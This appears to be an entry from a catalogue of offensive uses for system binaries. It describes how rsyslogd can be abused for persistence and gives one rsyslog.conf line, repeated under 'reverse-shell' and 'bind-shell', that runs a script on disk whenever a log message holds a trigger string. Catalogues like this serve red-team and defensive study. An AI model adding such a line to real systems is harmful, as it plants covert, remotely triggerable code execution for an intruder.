---
description: ryslogd can be abused for remotely triggerable persistence combining filter conditions and the shell execute action.
functions:
  reverse-shell:
    - description: After placing an executable or shell script on disk, you can trigger its execution via a logging facility by adding one line to the rsyslog.conf file
      code: |
        :msg, contains, "randomstringtomatch" ^/path/to/script.sh
  bind-shell:
    - description: After placing an executable or shell script on disk, you can trigger its execution via a logging facility by adding one line to the rsyslog.conf file
      code: |
        :msg, contains, "randomstringtomatch" ^/path/to/script.sh
---
